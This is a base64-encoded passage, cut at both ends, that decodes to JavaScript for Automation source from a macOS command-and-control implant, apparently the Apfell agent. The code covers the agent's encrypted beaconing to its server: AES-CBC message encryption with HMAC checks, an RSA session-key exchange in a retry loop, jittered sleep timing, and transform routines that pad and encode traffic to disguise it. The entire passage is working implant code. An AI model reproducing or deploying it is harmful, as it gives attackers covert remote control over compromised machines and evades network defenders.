cHQsICQoIlNlY1BhZGRpbmdLZXkiKSwgJCgiU2VjUGFkZGluZ1BLQ1M3S2V5IiksIGVycik7CgkgICAgYj0gJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZW5jcnlwdCwgJCgiU2VjRW5jcnlwdGlvbk1vZGUiKSwgJCgiU2VjTW9kZUNCQ0tleSIpLCBlcnIpOwoKICAgICAgICAvL2dlbmVyYXRlIGEgcmFuZG9tIElWIHRvIHVzZQoJICAgIGxldCBJViA9ICQuTlNNdXRhYmxlRGF0YS5kYXRhV2l0aExlbmd0aCgxNik7CgkgICAgJC5TZWNSYW5kb21Db3B5Qnl0ZXMoJC5rU2VjUmFuZG9tRGVmYXVsdCwgMTYsIElWLmJ5dGVzKTsKCSAgICBiID0gJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZW5jcnlwdCwgJCgiU2VjSVZLZXkiKSwgSVYsIGVycik7CgkgICAgLy8gc2V0IG91ciBkYXRhIHRvIGJlIGVuY3J5cHRlZAoJICAgIGxldCBuc2RhdGEgPSAkKGRhdGEpLmRhdGFVc2luZ0VuY29kaW5nKCQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpOwogICAgICAgIGI9JC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZW5jcnlwdCwgJC5rU2VjVHJhbnNmb3JtSW5wdXRBdHRyaWJ1dGVOYW1lLCBuc2RhdGEsIGVycik7CiAgICAgICAgLy8kLkNGU2hvdyhlcnJbMF0pOwogICAgICAgIGxldCBlbmNyeXB0ZWREYXRhID0gJC5TZWNUcmFuc2Zvcm1FeGVjdXRlKGVuY3J5cHQsIGVycik7CiAgICAgICAgLy8gbm93IHdlIG5lZWQgdG8gcHJlcGVuZCB0aGUgSVYgdG8gdGhlIGVuY3J5cHRlZCBkYXRhIGJlZm9yZSB3ZSBiYXNlNjQgZW5jb2RlIGFuZCByZXR1cm4gaXQKICAgICAgICAvL2dlbmVyYXRlIHRoZSBobWFjCgkgICAgbGV0IGhtYWNfdHJhbnNmb3JtID0gJC5TZWNEaWdlc3RUcmFuc2Zvcm1DcmVhdGUoJCgiSE1BQy1TSEEyIERpZ2VzdCBGYW1pbHkiKSwgMjU2LCBlcnIpOwoJICAgIGxldCBobWFjX2lucHV0ID0gJC5OU011dGFibGVEYXRhLmRhdGFXaXRoTGVuZ3RoKDApOwoJICAgIGhtYWNfaW5wdXQuYXBwZW5kRGF0YShJVik7CgkgICAgaG1hY19pbnB1dC5hcHBlbmREYXRhKGVuY3J5cHRlZERhdGEpOwoJCWI9JC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoaG1hY190cmFuc2Zvcm0sICQua1NlY1RyYW5zZm9ybUlucHV0QXR0cmlidXRlTmFtZSwgaG1hY19pbnB1dCwgZXJyKTsKCQliPSQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGhtYWNfdHJhbnNmb3JtLCAkLmtTZWNEaWdlc3RITUFDS2V5QXR0cmlidXRlLCAkLk5TRGF0YS5hbGxvYy5pbml0V2l0aEJhc2U2NEVuY29kaW5nKHRoaXMuYWVzX3BzayksIGVycik7CgkJbGV0IGhtYWNfZGF0YSA9ICQuU2VjVHJhbnNmb3JtRXhlY3V0ZShobWFjX3RyYW5zZm9ybSwgZXJyKTsKCiAgICAgICAgbGV0IGZpbmFsX21lc3NhZ2UgPSAkLk5TTXV0YWJsZURhdGEuZGF0YVdpdGhMZW5ndGgoMCk7CiAgICAgICAgZmluYWxfbWVzc2FnZS5hcHBlbmREYXRhKCAkKHVpZCkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU1VURjhTdHJpbmdFbmNvZGluZykgKTsKICAgICAgICBmaW5hbF9tZXNzYWdlLmFwcGVuZERhdGEoSVYpOwogICAgICAgIGZpbmFsX21lc3NhZ2UuYXBwZW5kRGF0YShlbmNyeXB0ZWREYXRhKTsKICAgICAgICBmaW5hbF9tZXNzYWdlLmFwcGVuZERhdGEoaG1hY19kYXRhKTsKICAgICAgICByZXR1cm4gZmluYWxfbWVzc2FnZS5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCk7Cgl9CglkZWNyeXB0X21lc3NhZ2UobnNkYXRhKXsKICAgICAgICAvL3Rha2VzIGluIGEgYmFzZTY0IGVuY29kZWQgc3RyaW5nIHRvIGJlIGRlY3J5cHRlZCBhbmQgcmV0dXJuZWQKICAgICAgICAvL2NvbnNvbGUubG9nKCJjYWxsZWQgZGVjcnlwdCIpOwogICAgICAgIGxldCBlcnIgPSBSZWYoKTsKICAgICAgICBsZXQgZGVjcnlwdCA9ICQuU2VjRGVjcnlwdFRyYW5zZm9ybUNyZWF0ZSh0aGlzLmNyeXB0b2tleSwgZXJyKTsKICAgICAgICAkLlNlY1RyYW5zZm9ybVNldEF0dHJpYnV0ZShkZWNyeXB0LCAkKCJTZWNQYWRkaW5nS2V5IiksICQoIlNlY1BhZGRpbmdQS0NTN0tleSIpLCBlcnIpOwoJICAgICQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGRlY3J5cHQsICQoIlNlY0VuY3J5cHRpb25Nb2RlIiksICQoIlNlY01vZGVDQkNLZXkiKSwgZXJyKTsKCSAgICAvL2NvbnNvbGUubG9nKCJtYWtpbmcgcmFuZ2VzIik7CiAgICAgICAgLy9uZWVkIHRvIGV4dHJhY3Qgb3V0IHRoZSBmaXJzdCAxNiBieXRlcyBhcyB0aGUgSVYgYW5kIHRoZSByZXN0IGlzIHRoZSBtZXNzYWdlIHRvIGRlY3J5cHQKICAgICAgICBsZXQgaXZfcmFuZ2UgPSAkLk5TTWFrZVJhbmdlKDAsIDE2KTsKICAgICAgICBsZXQgbWVzc2FnZV9yYW5nZSA9ICQuTlNNYWtlUmFuZ2UoMTYsIG5zZGF0YS5sZW5ndGggLSA0OCk7IC8vIDE2IGZvciBJViAzMiBmb3IgaG1hYwogICAgICAgIGxldCBobWFjX3JhbmdlID0gJC5OU01ha2VSYW5nZShuc2RhdGEubGVuZ3RoIC0gMzIsIDMyKTsKICAgICAgICBsZXQgaG1hY19kYXRhX3JhbmdlID0gJC5OU01ha2VSYW5nZSgwLCBuc2RhdGEubGVuZ3RoIC0gMzIpOyAvLyBobWFjIGluY2x1ZGVzIElWICsgY2lwaGVydGV4dAogICAgICAgIC8vY29uc29sZS5sb2coImNhcnZpbmcgb3V0IGl2Iik7CiAgICAgICAgbGV0IGl2ID0gbnNkYXRhLnN1YmRhdGFXaXRoUmFuZ2UoaXZfcmFuZ2UpOwogICAgICAgICQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGRlY3J5cHQsICQoIlNlY0lWS2V5IiksIGl2LCBlcnIpOwogICAgICAgIGxldCBtZXNzYWdlID0gbnNkYXRhLnN1YmRhdGFXaXRoUmFuZ2UobWVzc2FnZV9yYW5nZSk7CiAgICAgICAgJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZGVjcnlwdCwgJCgiSU5QVVQiKSwgbWVzc2FnZSwgZXJyKTsKICAgICAgICAvLyBjcmVhdGUgYW4gaG1hYyBhbmQgdmVyaWZ5IGl0IG1hdGNoZXMKICAgICAgICBsZXQgbWVzc2FnZV9obWFjID0gbnNkYXRhLnN1YmRhdGFXaXRoUmFuZ2UoaG1hY19yYW5nZSk7CiAgICAgICAgbGV0IGhtYWNfdHJhbnNmb3JtID0gJC5TZWNEaWdlc3RUcmFuc2Zvcm1DcmVhdGUoJCgiSE1BQy1TSEEyIERpZ2VzdCBGYW1pbHkiKSwgMjU2LCBlcnIpOwoJCSQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGhtYWNfdHJhbnNmb3JtLCAkLmtTZWNUcmFuc2Zvcm1JbnB1dEF0dHJpYnV0ZU5hbWUsIG5zZGF0YS5zdWJkYXRhV2l0aFJhbmdlKGhtYWNfZGF0YV9yYW5nZSksIGVycik7CgkJJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoaG1hY190cmFuc2Zvcm0sICQua1NlY0RpZ2VzdEhNQUNLZXlBdHRyaWJ1dGUsICQuTlNEYXRhLmFsbG9jLmluaXRXaXRoQmFzZTY0RW5jb2RpbmcodGhpcy5hZXNfcHNrKSwgZXJyKTsKCQlsZXQgaG1hY19kYXRhID0gJC5TZWNUcmFuc2Zvcm1FeGVjdXRlKGhtYWNfdHJhbnNmb3JtLCBlcnIpOwoJCWlmKGhtYWNfZGF0YS5pc0VxdWFsVG9EYXRhKG1lc3NhZ2VfaG1hYykpewoJCQlsZXQgZGVjcnlwdGVkRGF0YSA9ICQuU2VjVHJhbnNmb3JtRXhlY3V0ZShkZWNyeXB0LCBSZWYoKSk7CgkgICAgICAgIC8vY29uc29sZS5sb2coIm1ha2luZyBhIHN0cmluZyBmcm9tIHRoZSBtZXNzYWdlIik7CgkgICAgICAgIGxldCBkZWNyeXB0ZWRfbWVzc2FnZSA9ICQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcoZGVjcnlwdGVkRGF0YSwgJC5OU1VURjhTdHJpbmdFbmNvZGluZyk7CgkgICAgICAgIC8vY29uc29sZS5sb2coZGVjcnlwdGVkX21lc3NhZ2UuanMpOwoJICAgICAgICByZXR1cm4gZGVjcnlwdGVkX21lc3NhZ2U7CgkJfQoJCWVsc2V7CgkJCXJldHVybiB1bmRlZmluZWQ7CgkJfQoJfQogICAgbmVnb3RpYXRlX2tleSgpewogICAgICAgIC8vIEdlbmVyYXRlIGEgcHVibGljL3ByaXZhdGUga2V5IHBhaXIKICAgICAgICBsZXQgcGFyYW1ldGVycyA9ICQoeyJ0eXBlIjogJCgiNDIiKSwgImJzaXoiOiA0MDk2LCAicGVybSI6IGZhbHNlfSk7CiAgICAgICAgbGV0IGVyciA9IFJlZigpOwogICAgICAgIGxldCBwcml2YXRla2V5ID0gJC5TZWNLZXlDcmVhdGVSYW5kb21LZXkocGFyYW1ldGVycywgZXJyKTsKICAgICAgICAvL2NvbnNvbGUubG9nKCJnZW5lcmF0ZWQgbmV3IGtleSIpOwogICAgICAgIGxldCBwdWJsaWNrZXkgPSAkLlNlY0tleUNvcHlQdWJsaWNLZXkocHJpdmF0ZWtleSk7CiAgICAgICAgbGV0IGV4cG9ydGVkX3B1YmxpYyA9ICQuU2VjS2V5Q29weUV4dGVybmFsUmVwcmVzZW50YXRpb24ocHVibGlja2V5LCBlcnIpOwogICAgICAgIC8vJC5DRlNob3coJC5DRk1ha2VDb2xsZWN0YWJsZShlcnJbMF0pKTsKICAgICAgICB0cnl7CiAgICAgICAgCS8vdGhpcyBpcyB0aGUgY2F0YWxpbmEgY2FzZQogICAgICAgIAlsZXQgYjY0X2V4cG9ydGVkX3B1YmxpYyA9ICQuQ0ZNYWtlQ29sbGVjdGFibGUoZXhwb3J0ZWRfcHVibGljKTsKICAgICAgICAJYjY0X2V4cG9ydGVkX3B1YmxpYyA9IGI2NF9leHBvcnRlZF9wdWJsaWMuYmFzZTY0RW5jb2RlZFN0cmluZ1dpdGhPcHRpb25zKDApLmpzOyAvLyBnZXQgYSBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgdmVyc2lvbgogICAgICAgIAlleHBvcnRlZF9wdWJsaWMgPSBiNjRfZXhwb3J0ZWRfcHVibGljOwogICAgICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgCS8vdGhpcyBpcyB0aGUgbW9qYXZlIGFuZCBoaWdoIHNpZXJyYSBjYXNlCiAgICAgICAgCWV4cG9ydGVkX3B1YmxpYyA9IGV4cG9ydGVkX3B1YmxpYy5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCkuanM7CiAgICAgICAgfQogICAgICAgIGxldCBzID0gImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IjsKCSAgICBsZXQgc2Vzc2lvbl9rZXkgPSBBcnJheSgyMCkuam9pbigpLnNwbGl0KCcsJykubWFwKGZ1bmN0aW9uKCkgeyByZXR1cm4gcy5jaGFyQXQoTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogcy5sZW5ndGgpKTsgfSkuam9pbignJyk7CgkgICAgbGV0IGluaXRpYWxfbWVzc2FnZSA9IHsic2Vzc2lvbl9pZCI6IHNlc3Npb25fa2V5LCAicHViX2tleSI6IGV4cG9ydGVkX3B1YmxpYywgImFjdGlvbiI6ICJzdGFnaW5nX3JzYSJ9OwoJICAgLy8gRW5jcnlwdCBvdXIgaW5pdGlhbCBtZXNzYWdlIHdpdGggc2Vzc2lvbklEIGFuZCBQdWJsaWMga2V5IHdpdGggdGhlIGluaXRpYWwgQUVTIGtleQogICAgd2hpbGUodHJ1ZSl7CiAgICAgIHRyeXsKICAgICAgICAvL2xldCByZXEgPSB0aGlzLmNyZWF0ZV9tZXNzYWdlKHRoaXMuZ2V0X3JhbmRvbV9lbGVtZW50KHRoaXMucG9zdF9tZXNzYWdlcyksIGluaXRpYWxfbWVzc2FnZSwgYXBmZWxsLnV1aWQpOwogICAgICAgIC8vbGV0IHN0YWdlMSA9IHRoaXMubWFrZV9yZXF1ZXN0KHJlcSk7CiAgICAgICAgbGV0IHN0YWdlMSA9IHRoaXMubWFrZV9yZXF1ZXN0KCJQT1NUIiwgYXBmZWxsLnV1aWQsIGluaXRpYWxfbWVzc2FnZSk7CiAgICAgICAgbGV0IGVuY19rZXkgPSAkLk5TRGF0YS5hbGxvYy5pbml0V2l0aEJhc2U2NEVuY29kaW5nKHN0YWdlMVsnc2Vzc2lvbl9rZXknXSk7CiAgICAgICAgbGV0IGRlY19rZXkgPSAkLlNlY0tleUNyZWF0ZURlY3J5cHRlZERhdGEocHJpdmF0ZWtleSwgJC5rU2VjS2V5QWxnb3JpdGhtUlNBRW5jcnlwdGlvbk9BRVBTSEExLCBlbmNfa2V5LCBlcnIpOwogICAgICAgIC8vIEFkanVzdCBvdXIgZ2xvYmFsIGtleSBpbmZvcm1hdGlvbiB3aXRoIHRoZSBuZXdseSBhZGp1c3RlZCBzZXNzaW9uIGtleQogICAgICAgIHRyeXsKICAgICAgICAgICAgdGhpcy5hZXNfcHNrID0gZGVjX2tleS5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCkuanM7IC8vIGJhc2U2NCBlbmNvZGVkIGtleQogICAgICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgICAgIGxldCBkZWNfa2V5X2NvbGxlY3RhYmxlID0gJC5DRk1ha2VDb2xsZWN0YWJsZShkZWNfa2V5KTsKICAgICAgICAgICAgZGVjX2tleV9jb2xsZWN0YWJsZSA9IGRlY19rZXlfY29sbGVjdGFibGUuYmFzZTY0RW5jb2RlZFN0cmluZ1dpdGhPcHRpb25zKDApLmpzOwogICAgICAgICAgICB0aGlzLmFlc19wc2sgPSBkZWNfa2V5X2NvbGxlY3RhYmxlOwogICAgICAgIH0KICAgICAgICAvL2NvbnNvbGUubG9nKEpTT04uc3RyaW5naWZ5KGpzb25fcmVzcG9uc2UpKTsKICAgICAgICB0aGlzLnBhcmFtZXRlcnMgPSAkKHsidHlwZSI6ICQua1NlY0F0dHJLZXlUeXBlQUVTfSk7CiAgICAgICAgdGhpcy5yYXdfa2V5ID0gJC5OU0RhdGEuYWxsb2MuaW5pdFdpdGhCYXNlNjRFbmNvZGluZyh0aGlzLmFlc19wc2spOwogICAgICAgIHRoaXMuY3J5cHRva2V5ID0gJC5TZWNLZXlDcmVhdGVGcm9tRGF0YSh0aGlzLnBhcmFtZXRlcnMsIHRoaXMucmF3X2tleSwgUmVmKCkpOwogICAgICAgIHRoaXMuZXhjaGFuZ2luZ19rZXlzID0gZmFsc2U7CiAgICAgICAgcmV0dXJuIHN0YWdlMVsndXVpZCddOwogICAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIC8vY29uc29sZS5sb2coImVycm9yIGluIG5lZ290aWF0ZV9rZXk6ICIgKyBlcnJvci50b1N0cmluZygpKTsKICAgICAgICAkLk5TVGhyZWFkLnNsZWVwRm9yVGltZUludGVydmFsKHRoaXMuZ2VuX3NsZWVwX3RpbWUoKSk7ICAvLyBkb24ndCBzcGluIG91dCBjcmF6eSBpZiB0aGUgY29ubmVjdGlvbiBmYWlscwogICAgICB9CiAgICB9CiAgfQogIGdlbl9zbGVlcF90aW1lKCl7CiAgICAgIC8vZ2VuZXJhdGUgYSB0aW1lIHRoYXQncyB0aGlzLmludGVydmFsICs9ICh0aGlzLmludGVydmFsICogMS90aGlzLmppdHRlcikKICAgICAgbGV0IHBsdXNfbWluID0gTWF0aC5yb3VuZChNYXRoLnJhbmRvbSgpKTsKICAgICAgaWYocGx1c19taW4gPT09IDEpewogICAgICAgICAgcmV0dXJuIHRoaXMuaW50ZXJ2YWwgKyAodGhpcy5pbnRlcnZhbCAqIChNYXRoLnJvdW5kKE1hdGgucmFuZG9tKCkqdGhpcy5qaXR0ZXIpLzEwMCkpOwogICAgICB9ZWxzZXsKICAgICAgICAgIHJldHVybiB0aGlzLmludGVydmFsIC0gKHRoaXMuaW50ZXJ2YWwgKiAoTWF0aC5yb3VuZChNYXRoLnJhbmRvbSgpKnRoaXMuaml0dGVyKS8xMDApKTsKICAgICAgfQogICAgfQogIHByZXBlbmQoKXsKICAgIHJldHVybiBhcmd1bWVudHNbMV0gKyBhcmd1bWVudHNbMF07CiAgfQogIHJfcHJlcGVuZCgpewogICAgcmV0dXJuIGFyZ3VtZW50c1swXS5zbGljZShTdHJpbmcoYXJndW1lbnRzWzFdKS5sZW5ndGgpOwogIH0KICBhcHBlbmQoKXsKICAgIHJldHVybiBhcmd1bWVudHNbMF0gKyBhcmd1bWVudHNbMV07CiAgfQogIHJfYXBwZW5kKCl7CiAgICByZXR1cm4gYXJndW1lbnRzWzBdLnNsaWNlKDAsIC0xICogU3RyaW5nKGFyZ3VtZW50c1sxXSkubGVuZ3RoKTsKICB9CiAgYjY0KCl7CiAgICByZXR1cm4gYmFzZTY0X2VuY29kZShTdHJpbmcoYXJndW1lbnRzWzBdKSk7CiAgfQogIHJfYjY0KCl7CiAgICByZXR1cm4gYmFzZTY0X2RlY29kZShTdHJpbmcoYXJndW1lbnRzWzBdKSk7CiAgfQogIHJhbmRvbV9taXhlZCgpewogICAgICBsZXQgbSA9IFsuLi5BcnJheShOdW1iZXIoYXJndW1lbnRzWzFdKSldLm1hcChpPT4ofn4oTWF0aC5yYW5kb20oKSozNikpLnRvU3RyaW5nKDM2KSkuam9pbignJyk7CiAgICAgIHJldHVybiBhcmd1bWVudHNbMF0gKyBtOwogIH0KICByX3JhbmRvbV9taXhlZCgpewogICAgICByZXR1cm4gYXJndW1lbnRzWzBdLnNsaWNlKDAsIC0xICogTnVtYmVyKGFyZ3VtZW50c1sxXSkpOwogICAgfQogIHJhbmRvbV9udW1iZXIoKXsKICAgICAgbGV0IG0gPSBbLi4uQXJyYXkoTnVtYmVyKGFyZ3VtZW50c1sxXSkpXS5tYXAoaT0+KH5+KE1hdGgucmFuZG9tKCkqMTApKS50b1N0cmluZygxMCkpLmpvaW4oJycpOwogICAgICByZXR1cm4gYXJndW1lbnRzWzBdICsgbTsKICB9CiAgcl9yYW5kb21fbnVtYmVyKCl7CiAgICAgIHJldHVybiBhcmd1bWVudHNbMF0uc2xpY2UoMCwgLTEgKiBOdW1iZXIoYXJndW1lbnRzWzFdKSk7CiAgICB9CiAgcmFuZG9tX2FscGhhKCl7CiAgICAgIGxldCBzID0gImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoiOwogICAgICBsZXQgbSA9IEFycmF5KE51bWJlcihhcmd1bWVudHNbMV0pKS5qb2luKCkuc3BsaXQoJywnKS5tYXAoZnVuY3Rpb24oKSB7IHJldHVybiBzLmNoYXJBdChNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBzLmxlbmd0aCkpOyB9KS5qb2luKCcnKTsKICAgICAgcmV0dXJuIGFyZ3VtZW50c1swXSArIG07CiAgfQogIHJfcmFuZG9tX2FscGhhKCl7CiAgICAgIHJldHVybiBhcmd1bWVudHNbMF0uc2xpY2UoMCwgLTEgKiBOdW1iZXIoYXJndW1lbnRzWzFdKSk7CiAgICB9CiAgY2hvb3NlX3JhbmRvbSgpewogICAgICAgIGxldCBjaG9pY2UgPSBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqIGFyZ3VtZW50c1sxXS5sZW5ndGgpOwogICAgICAgIGlmKGNob2ljZSA9PT0gYXJndW1lbnRzWzFdLmxlbmd0aCl7Y2hvaWNlIC09IDE7fQogICAgICAgIHJldHVybiBhcmd1bWVudHNbMF0gKyBhcmd1bWVudHNbMV1bY2hvaWNlXTsKICAgIH0KICAgIHJfY2hvb3NlX3JhbmRvbSgpewoJICAgIGZvcihsZXQgaSA9IDA7IGkgPCBhcmd1bWVudHNbMV0ubGVuZ3RoOyBpKyspewoJICAgICAgICBpZihhcmd1bWVudHNbMF0uaW5jbHVkZXMoYXJndW1lbnRzWzFdW2ldKSl7CgkgICAgICAgICAgICByZXR1cm4gYXJndW1lbnRzWzBdLnJlcGxhY2UoYXJndW1lbnRzWzFdW2ldLCAiIik7CiAgICAgICAgICAgIH0KICAgICAgICB9CgkgICAgcmV0dXJuIGFyZ3VtZW50c1swXTsKICAgIH0KICAgIGdldF92YWx1ZSh2YWx1ZSwgdHJhbnNmb3Jtcyl7CiAgICAgIGxldCB0bXAgPSB2YWx1ZTsKICAgICAgdHJ5IHsKICAgICAgICAgIGlmICh0cmFuc2Zvcm1zLmxlbmd0aCA+IDApIHsKICAgICAgICAgICAgICBmb3IgKGxldCBpID0gdHJhbnNmb3Jtcy5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgewogICAgICAgICAgICAgICAgICBzd2l0Y2ggKHRyYW5zZm9ybXNbaV1bJ2Z1bmN0aW9uJ10pIHsKICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImJhc2U2NCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gdGhpcy5yX2I2NCh0bXApOwogICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgY2FzZSAicHJlcGVuZCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gdGhpcy5yX3ByZXBlbmQodG1wLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgY2FzZSAiYXBwZW5kIjoKICAgICAgICAgICAgICAgICAgICAgICAgICB0bXAgPSB0aGlzLnJfYXBwZW5kKHRtcCwgdHJhbnNmb3Jtc1tpXVsncGFyYW1ldGVycyddKTsKICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInJhbmRvbV9taXhlZCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gdGhpcy5yX3JhbmRvbV9taXhlZCh0bXAsIHRyYW5zZm9ybXNbaV1bJ3BhcmFtZXRlcnMnXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICBjYXNlICJyYW5kb21fbnVtYmVyIjoKICAgICAgICAgICAgICAgICAgICAgICAgICB0bXAgPSB0aGlzLnJfcmFuZG9tX251bWJlcih0bXAsIHRyYW5zZm9ybXNbaV1bJ3BhcmFtZXRlcnMnXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICBjYXNlICJyYW5kb21fYWxwaGEiOgogICAgICAgICAgICAgICAgICAgICAgICAgIHRtcCA9IHRoaXMucl9yYW5kb21fYWxwaGEodG1wLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgY2FzZSAiY2hvb3NlX3JhbmRvbSI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gdGhpcy5yX2Nob29zZV9yYW5kb20odG1wLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgfQogICAgICAgICAgfQogICAgICAgICAgcmV0dXJuIHRtcDsKICAgICAgfWNhdGNoKGVycm9yKXsKICAgICAgICAgIHJldHVybiAiIjsKICAgICAgfQogICAgfQogICAgcmV0cmlldmVfbWVzc2FnZShyZXNwb25zZSwgbWV0aG9kPSJQT1NUIil7CiAgICAgIGxldCBkYXRhID0gdGhpcy5nZXRfdmFsdWUoKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcocmVzcG9uc2UsICQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpKS5qcywgdGhpcy5jMl9jb25maWdbbWV0aG9kXVsnU2VydmVyQm9keSddKTsKICAgICAgLy9jb25zb2xlLmxvZygiaW4gcmV0cmlldmVfbWVzc2FnZSwgcmV0dXJuaW5nOiAiICsgZGF0YSk7CiAgICAgIHJldHVybiBkYXRhOwogICAgfQogICAgY3JlYXRlX3ZhbHVlKHZhbHVlLCB0cmFuc2Zvcm1zKXsKICAgICAgZm9yKGxldCBpID0gMDsgaSA8IHRyYW5zZm9ybXMubGVuZ3RoOyBpKyspewogICAgICAgIHN3aXRjaCh0cmFuc2Zvcm1zW2ldWydmdW5jdGlvbiddKXsKICAgICAgICAgIGNhc2UgImJhc2U2NCI6CiAgICAgICAgICAgICAgdmFsdWUgPSB0aGlzLmI2NCh2YWx1ZSk7CiAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICBjYXNlICJwcmVwZW5kIjoKICAgICAgICAgICAgICB2YWx1ZSA9IHRoaXMucHJlcGVuZCh2YWx1ZSwgdHJhbnNmb3Jtc1tpXVsncGFyYW1ldGVycyddKTsKICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgIGNhc2UgImFwcGVuZCI6CiAgICAgICAgICAgICAgdmFsdWUgPSB0aGlzLmFwcGVuZCh2YWx1ZSwgdHJhbnNmb3Jtc1tpXVsncGFyYW1ldGVycyddKTsKICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgIGNhc2UgInJhbmRvbV9taXhlZCI6CiAgICAgICAgICAgICAgdmFsdWUgPSB0aGlzLnJhbmRvbV9taXhlZCh2YWx1ZSwgdHJhbnNmb3Jtc1tpXVsncGFyYW1ldGVycyddKTsKICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgIGNhc2UgInJhbmRvbV9udW1iZXIiOgogICAgICAgICAgICAgIHZhbHVlID0gdGhpcy5yYW5kb21fbnVtYmVyKHZhbHVlLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgY2FzZSAicmFuZG9tX2FscGhhIjoKICAgICAgICAgICAgICB2YWx1ZSA9IHRoaXMucmFuZG9tX2FscGhhKHZhbHVlLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICJjaG9vc2VfcmFuZG9tIjoKICAgICAgICAgICAgICAgIHZhbHVlID0gdGhpcy5jaG9vc2VfcmFuZG9tKHZhbHVlLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgIH0KICAgICAgfQogICAgICByZXR1cm4gdmFsdWU7CiAgICB9CiAgICBjcmVhdGVfbWVzc2FnZShlbmRwb2ludCwgZGF0YSwgYWdlbnRfaWQ9YXBmZWxsLmlkLCBtZXRob2Q9IlBPU1QiKXsKCSAgICBpZih0aGlzLmFlc19wc2sgIT09ICIiKXsKICAgICAgICAgICAgZGF0YSA9IHRoaXMuZW5jcnlwdF9tZXNzYWdlKGFnZW50X2lkLCBKU09OLnN0cmluZ2lmeShkYXRhKSkuanM7CiAgICAgICAgfWVsc2UgaWYodHlwZW9mKHNlbmREYXRhKSA9PT0gInN0cmluZyIpewogICAgICAgIAlkYXRhID0gJCh1aWQgKyBzZW5kRGF0YSkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU1VURjhTdHJpbmdFbmNvZGluZyk7CiAgICAgICAgICAgIGRhdGEgPSBkYXRhLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKTsKICAgICAgICB9ZWxzZXsKCSAgICAgICAgZGF0YSA9ICQoYWdlbnRfaWQgKyBKU09OLnN0cmluZ2lmeShkYXRhKSkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU1VURjhTdHJpbmdFbmNvZGluZyk7CiAgICAgICAgICAgIGRhdGEgPSBkYXRhLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgICAgICB9CiAgICAgICAgbGV0IGJhc2VfdXJsID0gdGhpcy5nZXRfcmFuZG9tX2VsZW1lbnQoZW5kcG9pbnRbJ3VybHMnXSk7CiAgICAgICAgbGV0IGJhc2VfdXJpID0gZW5kcG9pbnRbJ3VyaSddOwogICAgICAgIGZvcihsZXQgaSBpbiBlbmRwb2ludFsndXJsRnVuY3Rpb25zJ10pewogICAgICAgICAgICBsZXQgdmFsdWUgPSBlbmRwb2ludFsndXJsRnVuY3Rpb25zJ11baV1bJ3ZhbHVlJ107CiAgICAgICAgICAgIGlmKHZhbHV